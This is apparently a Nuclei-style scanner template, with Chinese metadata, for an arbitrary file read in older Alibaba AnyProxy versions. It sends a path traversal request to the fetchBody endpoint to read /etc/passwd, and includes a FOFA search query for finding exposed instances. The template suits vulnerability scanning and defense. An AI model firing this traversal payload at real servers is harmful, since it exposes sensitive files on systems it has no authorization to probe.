script_name: Alibaba AnyProxy fetchBody 任意文件读取漏洞
content:
id: Alibaba-AnyProxy-fetchBody-FileRead

info:
  name: Alibaba AnyProxy fetchBody FileRead
  author: cr
  severity: high
  description: Alibaba-fetchBody-FileRead
  tags: AnyProxy,FileRead

requests:
  - method: GET
    path:
      - '{{BaseURL}}/fetchBody?id=1/../../../../../../../../etc/passwd'


    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "resBody"
        part: body

      - type: status
        status:
          - 200
#fofa-query:"anyproxy"
help: Alibaba AnyProxy 低版本存在任意文件读取，通过漏洞，攻击者可以获取服务器敏感信息
author: cr
online_script_name: Alibaba AnyProxy fetchBody 任意文件读取漏洞
